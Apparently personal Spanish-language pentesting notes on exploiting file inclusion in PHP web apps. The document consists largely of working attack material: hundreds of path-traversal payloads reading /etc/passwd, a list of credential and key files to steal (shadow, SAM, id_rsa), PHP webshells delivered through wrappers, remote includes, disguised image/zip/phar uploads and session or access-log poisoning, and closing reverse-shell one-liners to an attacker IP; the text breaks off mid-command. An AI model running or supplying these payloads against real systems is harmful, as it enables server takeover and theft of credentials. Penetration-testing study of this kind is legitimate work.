....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00
file://....//etc/passwd%00
file://....//....//etc/passwd%00
file://....//....//....//etc/passwd%00
file://....//....//....//....//etc/passwd%00
file://....//....//....//....//....//....//etc/passwd%00
file://....//....//....//....//....//....//....//etc/passwd%00
file://....//....//....//....//....//....//....//....//etc/passwd%00
file://....//....//....//....//....//....//....//....//....//etc/passwd%00
file://....//....//....//....//....//....//....//....//....//....//etc/passwd%00
file://....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00
file://....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00
file://....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd%00
%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd%00
..%252fetc%252fpasswd%00
..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00
%c0%ae%c0%ae/etc/passwd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
/%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd%00
/images/../../../etc/passwd%00
/images/../../../../etc/passwd%00
/images/../../../../../etc/passwd%00
/images/../../../../../../etc/passwd%00
/images/../../../../../../../etc/passwd%00
/images/../../../../../../../../etc/passwd%00
/var/www/images/../../../etc/passwd%00
/var/www/images/../../../../etc/passwd%00
/var/www/images/../../../../../etc/passwd%00
/var/www/images/../../../../../../etc/passwd%00
/var/www/images/../../../../../../../etc/passwd%00
/var/www/images/../../../../../../../../etc/passwd%00
/images/../../../etc/passwd%00.jpg
/images/../../../../etc/passwd%00.jpg
/images/../../../../../etc/passwd%00.jpg
/images/../../../../../../etc/passwd%00.jpg
/images/../../../../../../../etc/passwd%00.jpg
/images/../../../../../../../../etc/passwd%00.jpg
/var/www/images/../../../etc/passwd%00.jpg
/var/www/images/../../../../etc/passwd%00.jpg
/var/www/images/../../../../../etc/passwd%00.jpg
/var/www/images/../../../../../../etc/passwd%00.jpg
/var/www/images/../../../../../../../etc/passwd%00.jpg
/var/www/images/../../../../../../../../etc/passwd%00.jpg
/images/../../../etc/passwd%00.png
/images/../../../../etc/passwd%00.png
/images/../../../../../etc/passwd%00.png
/images/../../../../../../etc/passwd%00.png
/images/../../../../../../../etc/passwd%00.png
/images/../../../../../../../../etc/passwd%00.png
/var/www/images/../../../etc/passwd%00.png
/var/www/images/../../../../etc/passwd%00.png
/var/www/images/../../../../../etc/passwd%00.png
/var/www/images/../../../../../../etc/passwd%00.png
/var/www/images/../../../../../../../etc/passwd%00.png
/var/www/images/../../../../../../../../etc/passwd%00.png
/images/../../../etc/passwd%00.jpeg
/images/../../../../etc/passwd%00.jpeg
/images/../../../../../etc/passwd%00.jpeg
/images/../../../../../../etc/passwd%00.jpeg
/images/../../../../../../../etc/passwd%00.jpeg
/images/../../../../../../../../etc/passwd%00.jpeg
/var/www/images/../../../etc/passwd%00.jpeg
/var/www/images/../../../../etc/passwd%00.jpeg
/var/www/images/../../../../../etc/passwd%00.jpeg
/var/www/images/../../../../../../etc/passwd%00.jpeg
/var/www/images/../../../../../../../etc/passwd%00.jpeg
/var/www/images/../../../../../../../../etc/passwd%00.jpeg
../etc/passwd%00.jpg
../../etc/passwd%00.jpg
../../../etc/passwd%00.jpg
../../../../etc/passwd%00.jpg
../../../../../etc/passwd%00.jpg
../../../../../../etc/passwd%00.jpg
../../../../../../../etc/passwd%00.jpg
../../../../../../../../etc/passwd%00.jpg
../../../../../../../../../etc/passwd%00.jpg
../../../../../../../../../../etc/passwd%00.jpg
../../../../../../../../../../../etc/passwd%00.jpg
../../../../../../../../../../../../etc/passwd%00.jpg
../../../../../../../../../../../../../etc/passwd%00.jpg
../../../../../../../../../../../../../../etc/passwd%00.jpg
../../../../../../../../../../../../../../../etc/passwd%00.jpg
file:///etc/passwd%00.jpg
file://../etc/passwd%00.jpg
file://../../etc/passwd%00.jpg
file://../../../etc/passwd%00.jpg
file://../../../../etc/passwd%00.jpg
file://../../../../../etc/passwd%00.jpg
file://../../../../../../etc/passwd%00.jpg
file://../../../../../../../etc/passwd%00.jpg
file://../../../../../../../../etc/passwd%00.jpg
file://../../../../../../../../../etc/passwd%00.jpg
file://../../../../../../../../../../etc/passwd%00.jpg
file://../../../../../../../../../../../etc/passwd%00.jpg
file://../../../../../../../../../../../../etc/passwd%00.jpg
file://../../../../../../../../../../../../../etc/passwd%00.jpg
file://../../../../../../../../../../../../../../etc/passwd%00.jpg
file://../../../../../../../../../../../../../../../etc/passwd%00.jpg
../etc/passwd%00.png
../../etc/passwd%00.png
../../../etc/passwd%00.png
../../../../etc/passwd%00.png
../../../../../etc/passwd%00.png
../../../../../../etc/passwd%00.png
../../../../../../../etc/passwd%00.png
../../../../../../../../etc/passwd%00.png
../../../../../../../../../etc/passwd%00.png
../../../../../../../../../../etc/passwd%00.png
../../../../../../../../../../../etc/passwd%00.png
../../../../../../../../../../../../etc/passwd%00.png
../../../../../../../../../../../../../etc/passwd%00.png
../../../../../../../../../../../../../../etc/passwd%00.png
../../../../../../../../../../../../../../../etc/passwd%00.png
file:///etc/passwd%00.png
file://../etc/passwd%00.png
file://../../etc/passwd%00.png
file://../../../etc/passwd%00.png
file://../../../../etc/passwd%00.png
file://../../../../../etc/passwd%00.png
file://../../../../../../etc/passwd%00.png
file://../../../../../../../etc/passwd%00.png
file://../../../../../../../../etc/passwd%00.png
file://../../../../../../../../../etc/passwd%00.png
file://../../../../../../../../../../etc/passwd%00.png
file://../../../../../../../../../../../etc/passwd%00.png
file://../../../../../../../../../../../../etc/passwd%00.png
file://../../../../../../../../../../../../../etc/passwd%00.png
file://../../../../../../../../../../../../../../etc/passwd%00.png
file://../../../../../../../../../../../../../../../etc/passwd%00.png
../etc/passwd%00.svg
../../etc/passwd%00.svg
../../../etc/passwd%00.svg
../../../../etc/passwd%00.svg
../../../../../etc/passwd%00.svg
../../../../../../etc/passwd%00.svg
../../../../../../../etc/passwd%00.svg
../../../../../../../../etc/passwd%00.svg
../../../../../../../../../etc/passwd%00.svg
../../../../../../../../../../etc/passwd%00.svg
../../../../../../../../../../../etc/passwd%00.svg
../../../../../../../../../../../../etc/passwd%00.svg
../../../../../../../../../../../../../etc/passwd%00.svg
../../../../../../../../../../../../../../etc/passwd%00.svg
../../../../../../../../../../../../../../../etc/passwd%00.svg
file:///etc/passwd%00.svg
file://../etc/passwd%00.svg
file://../../etc/passwd%00.svg
file://../../../etc/passwd%00.svg
file://../../../../etc/passwd%00.svg
file://../../../../../etc/passwd%00.svg
file://../../../../../../etc/passwd%00.svg
file://../../../../../../../etc/passwd%00.svg
file://../../../../../../../../etc/passwd%00.svg
file://../../../../../../../../../etc/passwd%00.svg
file://../../../../../../../../../../etc/passwd%00.svg
file://../../../../../../../../../../../etc/passwd%00.svg
file://../../../../../../../../../../../../etc/passwd%00.svg
file://../../../../../../../../../../../../../etc/passwd%00.svg
file://../../../../../../../../../../../../../../etc/passwd%00.svg
file://../../../../../../../../../../../../../../../etc/passwd%00.svg
../etc/passwd%00.gif
../../etc/passwd%00.gif
../../../etc/passwd%00.gif
../../../../etc/passwd%00.gif
../../../../../etc/passwd%00.gif
../../../../../../etc/passwd%00.gif
../../../../../../../etc/passwd%00.gif
../../../../../../../../etc/passwd%00.gif
../../../../../../../../../etc/passwd%00.gif
../../../../../../../../../../etc/passwd%00.gif
../../../../../../../../../../../etc/passwd%00.gif
../../../../../../../../../../../../etc/passwd%00.gif
../../../../../../../../../../../../../etc/passwd%00.gif
../../../../../../../../../../../../../../etc/passwd%00.gif
../../../../../../../../../../../../../../../etc/passwd%00.gif
file:///etc/passwd%00.gif
file://../etc/passwd%00.gif
file://../../etc/passwd%00.gif
file://../../../etc/passwd%00.gif
file://../../../../etc/passwd%00.gif
file://../../../../../etc/passwd%00.gif
file://../../../../../../etc/passwd%00.gif
file://../../../../../../../etc/passwd%00.gif
file://../../../../../../../../etc/passwd%00.gif
file://../../../../../../../../../etc/passwd%00.gif
file://../../../../../../../../../../etc/passwd%00.gif
file://../../../../../../../../../../../etc/passwd%00.gif
file://../../../../../../../../../../../../etc/passwd%00.gif
file://../../../../../../../../../../../../../etc/passwd%00.gif
file://../../../../../../../../../../../../../../etc/passwd%00.gif
file://../../../../../../../../../../../../../../../etc/passwd%00.gif
```

## ARCHIVOS POTENCIALES

Recursos interesantes siempre a mirar son los siguientes:

**LINUX**

```bash
/etc/issue 
/etc/motd 
/etc/passwd 
/etc/group 
/etc/resolv.conf
/etc/shadow
/home/[USERNAME]/.bash_history o .profile
~/.bash_history o .profile
$USER/.bash_history o .profile
/root/.bash_history o .profile
/etc/mtab  
/etc/inetd.conf  
/var/log/dmessage
.htaccess
config.php
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/apache/error.log
/var/log/apache/access.log
/var/log/httpd/error_log
/var/log/access_log
/var/log/mail
/var/log/sshd.log
/var/log/vsftpd.log
.bash_history
.mysql_history
.my.cnf
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```

**WINDOWS**

```bash
c:\WINDOWS\system32\eula.txt
c:\boot.ini  
c:\WINDOWS\win.ini  
c:\WINNT\win.ini  
c:\WINDOWS\Repair\SAM  
c:\WINDOWS\php.ini  
c:\WINNT\php.ini  
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
c:\php\php.ini  
c:\php5\php.ini  
c:\php4\php.ini  
c:\apache\php\php.ini  
c:\xampp\apache\bin\php.ini  
c:\home2\bin\stable\apache\php.ini  
c:\home\bin\stable\apache\php.ini
c:\Program Files\Apache Group\Apache\logs\access.log  
c:\Program Files\Apache Group\Apache\logs\error.log
c:\WINDOWS\TEMP\  
c:\php\sessions\  
c:\php5\sessions\  
c:\php4\sessions\
windows\repair\SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

- [https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)

## DE LFI A RCE

Para obtener la ejecucion remota de comandos la idea es que podamos leer un archivo de logs con el LFI o RFI (tener permisos de lectura) y que esos logs los interprete la web, para eso se injectara codigo malicioso en PHP que sera interpretado y para dar una ejecucion de comandos remoto.

### PHP WRAPPERS

#### wrapper data

El WRAPPER DATA se puede utilizar para incluir datos externos, incluido el código PHP. Sin embargo, esto solo está disponible para usar si la configuración (`allow_url_include`) está habilitada en las configuraciones de PHP.

**Comprobación de las configuraciones de PHP**

Para hacerlo, podemos incluir el archivo de configuración de PHP que se encuentra en ( `/etc/php/X.Y/apache2/php.ini`) para Apache o en ( `/etc/php/X.Y/fpm/php.ini`) para Nginx, donde `X.Y`está su versión de instalación de PHP.

Usaremos el filtro `base64`, ya que los archivos `.ini` son similares a los archivos `.php` y deben codificarse para evitar que se rompan.

```bash
#obtencion del archivo ode configuracion en base64
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

#verificacion de la configuracion
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

si el resultado es `allow_url_include = On` podemos continuar.

>[!note]
>Esta opcion no esta habilitada por defecto.

**ejecucion remota de comandos**

Con `allow_url_include` habilitado, podemos continuar con nuestroataque usando el wrapper `data`. Como se mencionó anteriormente, este wrapper se puede usar para incluir datos externos, incluido el código PHP. También podemos pasarle cadenas codificadas en `base64` con `text/plain;base64`, y tiene la capacidad de decodificarlas y ejecutar el código PHP.

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64 

data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

#### wrapper input

Similar al wrapper `data`, el wrapper `input` se puede usar para incluir entradas externas y ejecutar código PHP. La diferencia es que a este wrapper hay que pasarle nuestro payload PHP como la **data** de una solicitud POST. Por lo tanto, el parámetro vulnerable debe aceptar solicitudes POST para que este ataque funcione. Finalmente, el wrapper `input` también depende de la configuración`allow_url_include`, como se mencionó anteriormente.

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

>[!note]
>Si solo acepta solicitudes POST y no GET (no podemos pasar comando por URL), entonces podemos poner nuestro comando directamente en nuestro código PHP, en lugar de un shell web dinámico (p. ej `<\?php system('id')?>`.)

#### wrapper expect

Finalmente, podemos utilizar el wrapper [expect](https://www.php.net/manual/en/wrappers.expect.php) , que nos permite ejecutar comandos directamente a través de flujos de URL.

Sin embargo, se espera que sea un envoltorio externo, por lo que debe instalarse y habilitarse manualmente en el servidor back-end, aunque algunas aplicaciones web dependen de él para su funcionalidad principal, por lo que podemos encontrarlo en casos específicos. Podemos determinar si está instalado en el servidor back-end tal como lo hicimos antes `allow_url_include`, pero lo haríamos `grep expect` en su lugar:

```bash
#obtencion del archiv ode configuracion en base64
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

#verificacion de la configuracion
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

Para usar el módulo expect, podemos usar el wrapper `expect://` y luego pasar el comando que queremos ejecutar, de la siguiente manera:

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

### RFI

En algunos casos, también podemos incluir archivos remotos, si la función vulnerable permite la inclusión de URL remotas. Esto permite dos beneficios principales:

1.  Enumeración de puertos y aplicaciones web solo locales (es decir, SSRF)
2.  Obtener la ejecución remota de código al incluir un script malicioso que alojamos

las siguientes funciones permiten la inclusion de archivos remotos:

![[Pasted image 20230125160742.png]]

Como vemos, casi cualquier vulnerabilidad RFI es también una vulnerabilidad LFI, ya que cualquier función que permita incluir URLs remotas suele permitir también incluir locales. Sin embargo, una LFI puede no ser necesariamente una RFI. Esto se debe principalmente a tres razones:

1.  Es posible que la función vulnerable no permita incluir URL remotas
2.  Solo puede controlar una parte del nombre del archivo y no todo el envoltorio del protocolo (por ejemplo: `http://`, `ftp://`, `https://`).
3.  La configuración puede evitar la RFI por completo, ya que la mayoría de los servidores web modernos deshabilitan la inclusión de archivos remotos de forma predeterminada.

>[!note]
>Cualquier inclusión de URL remota en PHP requeriría que la configuración `allow_url_include` esté habilitada. En la anterior seccion vimos como comprobarlo.

Sin embargo, es posible que esto no siempre sea confiable, ya que incluso si esta configuración está habilitada, es posible que la función vulnerable no permita comenzar con la inclusión de URL remota. Entonces, una forma más confiable es intentar cargar la misma pagina en donde estamos:

```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

![[Pasted image 20230125162056.png]]

#### HTTP REMOTE FILE

Creamos una reverse shel en nuestra maquina local:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

levantamos un servidor web HTTP local:

```bash
sudo python3 -m http.server
```

llamamos a nuestro archivo PHP:

```bash
?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

>[!note]
>En estos casos el parametro por GET se lo pasa usando `&`.
>

>[!tip]
> Si vimos que se agregó una extensión adicional (.php) a la solicitud, podemos omitirla de nuestra carga útil.

#### FTP REMOTE FILE

Creamos una reverse shel en nuestra maquina local:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

levantamos un servidor FTP local:

```bash
sudo python -m pyftpdlib -p 21
```

llamamos a nuestro archivo PHP:

```bash
?language=ftp://user:pass@localhost/shell.php&cmd=id
```

#### SMB REMOTE FILE

Si la aplicación web vulnerable está alojada en un servidor de Windows (que podemos saber por la versión del servidor en los encabezados de respuesta HTTP), entonces **NO** necesitamos que la configuración`allow_url_include` esté habilitada para la explotación de RFI, ya que podemos utilizar el protocolo SMB para el inclusión remota de archivos.

Creamos una reverse shel en nuestra maquina local:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

levantamos un servidor SMB local:

```bash
impacket-smbserver -smb2support share $(pwd)
```

llamamos a nuestro archivo PHP:

```bash
?language=\\<OUR_IP>\shell.php&cmd=whoami
```

>[!note]
>Debemos tener en cuenta que esta técnica es mas probable que funcione cuando se esta en la msma red local.

### LFI Y FILE UPLOAD

#### GIF FILE

Si es posible la carga de archivos, cree uno con el siguiente contenido:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Este archivo por sí solo es completamente inofensivo y no afectaría en lo más mínimo a las aplicaciones web normales. Sin embargo, si lo combinamos con una vulnerabilidad LFI, es posible que podamos alcanzar la ejecución remota del código.

>[!tip]
>Podemos usar cualquier tecnica de **File Upload vulnerabilities** para la carga exitosa de un archivo.

Necesitamos saber la ruta a nuestro archivo cargado. En la mayoría de los casos, especialmente con imágenes, obtendríamos acceso a nuestro archivo cargado y podemos obtener su ruta desde su URL. En nuestro caso, si inspeccionamos el código fuente después de subir la imagen, podemos obtener su URL:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Con la ruta del archivo cargado a la mano, todo lo que tenemos que hacer es incluir el archivo cargado en la función vulnerable de LFI, y el código PHP debería ejecutarse de la siguiente manera:

```bash
?language=./profile_images/shell.gif&cmd=id
```

#### PNG FILE

Tambien podemos intentar lo anterior con un archivo PNG:

```bash
# archivo "file.png"

<?php system('whoami'); ?>
```

Carguelo, necesita conocer la ruta donde se almacena y llamarlo desde la url:

```bash
http://example.com/index.php?page=path/to/uploaded/file.png
```

#### ZIP FILE

odemos utilizar el wrapper `ZIP` para ejecutar código PHP. Sin embargo, este wrapper no está habilitado de forma predeterminada, por lo que es posible que este método no siempre funcione. 

Para hacerlo, podemos comenzar creando un script de shell web PHP y comprimiéndolo en un archivo zip (llamado `shell.jpg`), de la siguiente manera:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

>[!note]
>aunque llamamos a nuestro archivo zip como (shell.jpg), algunos formularios de carga aún pueden detectar nuestro archivo como un archivo zip a través de pruebas de tipo de contenido y no permitir su carga, por lo que este ataque tiene una mayor probabilidad de funcionar si la carga de archivos zip está permitido.

Una vez que cargamos el archivo`shell.jpg`, podemos incluirlo con el wrapper `zip` como ( `zip://shell.jpg`), y luego referirnos a cualquier archivo dentro de él con `#shell.php` (URL encoded). Finalmente, podemos ejecutar comandos como siempre lo hacemos con `&cmd=id`, de la siguiente manera:

```bash
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

#### PHAR

podemos usar el wrapper `phar://` para lograr un resultado similar. Para hacerlo, primero escribiremos el siguiente script PHP en un archivo `shell.php`:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Este script se puede compilar en un archivo `phar` que, cuando se llama, escribiría un shell web en un subarchivo `shell.txt`, con el que podemos interactuar. Podemos compilarlo en un archivo `phar` y renombrarlo de la siguiente manera `shell.jpg`:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Una vez que lo subimos a la aplicación web, podemos simplemente llamarlo con `phar://` y proporcionar su ruta URL, luego especificar el subarchivo phar con `/shell.txt` (URL codificado) para obtener el resultado del comando que especificamos con ( `&cmd=id`), de la siguiente manera:

```bash
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

### Log Poisoning 

#### PHP Sessions

Similar a los archivos de registro del servidor, PHP guarda las sesiones de usuario en el disco. Esta ruta está dictada por la `session.save_path` variable de configuración, que está vacía de forma predeterminada. En tales casos, los archivos de sesión se guardan en:

- la carpeta `/var/lib/php/sessions/` en Linux.
- la carpeta `C:\Windows\Temp` en Windows.

El nombre del archivo de sesión se puede identificar a partir de la `PHPSESSID` cookie. Por ejemplo, si la `PHPSESSID` cookie está configurada en `el4ukv0kqbvoirg7nkp4dncpk3`, su ubicación en el disco sería `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

Para este caso, comprobamos si el sitio web cuenta usa **PHP SESSION** (PHPSESSID) mandamos las siguientes cookies, o tambien con las herramientas del desarrollador en el navegador en el aparta de storage puedes ver las cookies:

```bash
Set-Cookie: PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

En PHP, estas sesiones son almacenadas en la ruta '**/var/lib/php5/sess[PHPSESSID]**':

```bash
/var/lib/php/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

#contenido
page|s:0:"en.php";preference|s:0:"English";
```

![[Pasted image 20230125224116.png]]

Podemos ver que el archivo de sesión contiene dos valores: `page`, que muestra la página del idioma seleccionado, y `preference`, que muestra el idioma seleccionado. El valor `preference` no está bajo nuestro control, ya que no lo especificamos en ninguna parte y debe especificarse automáticamente. Sin embargo, el valor `page` está bajo nuestro control, ya que podemos controlarlo a través del parámetro `?language=`.

>[!note]
>Tenemos que identificar que valor del contenido del log de sesion controlamos para inyectar contenido PHP.

```url
.../index.php?language=session_poisoning
```

Ahora, incluyamos el archivo de sesión una vez más para ver el contenido:

```bash
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

![[Pasted image 20230125224323.png]]

vamos a definir una webshell URL encodeada como parametro:

```bash
#<?php system(GET['cmd']); ?>
.../index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Una vez hecho, podemos incluir el archivo PHP de la siguiente forma a través del LFI para tener un RCE:

```bash
?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

![[Pasted image 20230125224508.png]]

>[!note]
>Para ejecutar otro comando, el archivo de sesión debe envenenarse con el shell web nuevamente, ya que se sobrescribe después de nuestra última inclusión. Idealmente, usaríamos el shell web envenenado para escribir un shell web permanente en el directorio web, o enviar un shell inverso para facilitar la interacción.

#### access.log & auth.log

Todos los ataques que discutiremos en esta sección se basan en el mismo concepto: escribir código PHP en un campo que controlamos que se registra en un archivo de registro y luego incluir ese archivo de registro para ejecutar el código PHP. Para que este ataque funcione, la aplicación web PHP debe tener privilegios de lectura sobre los archivos registrados, que varían de un servidor a otro.

Consiste en verificar si las siguientes rutas son visibles desde el **LFI**:

-  **/var/log/auth.log** y **/var/log/apache2/access.log** para apache
- **/var/log/nginx/access.log** para nginx

>[!note]
>Debe averiguar que servidor web es y buscar en google cual es el path de su archivo de logs.

En el caso  y verlo desde el navegardor se puede ver el contenido del User-Agent:

Ejemplo:

```bash
# User-Agent

Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
```

El contenido del user agent puede ser modificado ya sea con curl o con burpsuite, entonces como lo visualizamos desde el navegador que pasa si colocamos un codigo malicioso PHP en User-Agent? Pasa que este lo interpreta, podemos aprovecharnos de esto asi:

```bash
curl -s -H "User-Agent: <?php system($_GET['cmd']); ?>" "http://127.0.0.1/example.php?file=/var/log/apache2/access.log"
```

Al recargar la pagina se nos mostrara el resultado del comando dentro del archivo log en lugar del tipico User-Agent.

```bash
http://127.0.0.1/example.php?file=/var/log/apache2/access.log&cmd=id
```

De ahi podemos mandar una reverse shell:

```bash
nc -e /bin/bash <IP KALI> 443
bash -i >& /dev/tcp/<IP KALI>/8080 0>&1
bash -c 'bash -i >& /dev/tcp/<IP KALI>/8080 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP KALI> 1234 >/tmp/f
```

```bash
rlwrap nc -lvnp 443
```

Si en caso de darles error en todos los anteriores, se puede usar el truco de encodearlo en base64 y mandar eso para que se desencodee y pipearlo a una shell:

```bash
echo "nc -e /bin/bash <IP KALI> 443" | base64; echo

echo "bash -i >& /dev/tcp/<IP KALI>/8080 0>&1" | base64; echo

